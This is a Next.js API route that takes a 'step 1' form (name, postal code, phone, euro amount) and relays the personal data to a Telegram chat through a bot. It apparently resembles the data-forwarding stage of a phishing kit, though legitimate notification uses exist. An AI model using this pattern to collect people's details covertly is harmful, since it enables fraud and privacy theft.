import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    const { nomPrenom, codePostal, telephone, montant } = await req.json();

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    const message = `📋 *INFORMATIONS PERSONNELLES (ÉTAPE 1)*\n\n` +
      `• *Nom & Prénom :* ${nomPrenom || 'Non renseigné'}\n` +
      `• *Code Postal :* \`${codePostal || 'N/A'}\`\n` +
      `• *Téléphone :* \`${telephone || 'N/A'}\`\n` +
      `• *Montant :* \`${montant || '0'}\` €\n\n` +
      `📅 *Date :* ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`;

    if (botToken && chatId) {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown',
        }),
      });
    }

    return NextResponse.json({ success: true, message: 'Données enregistrées' });
  } catch (error) {
    console.error('Erreur lors du traitement step1 :', error);
    return NextResponse.json(
      { success: false, error: 'Erreur interne du serveur' },
      { status: 500 }
    );
  }
}
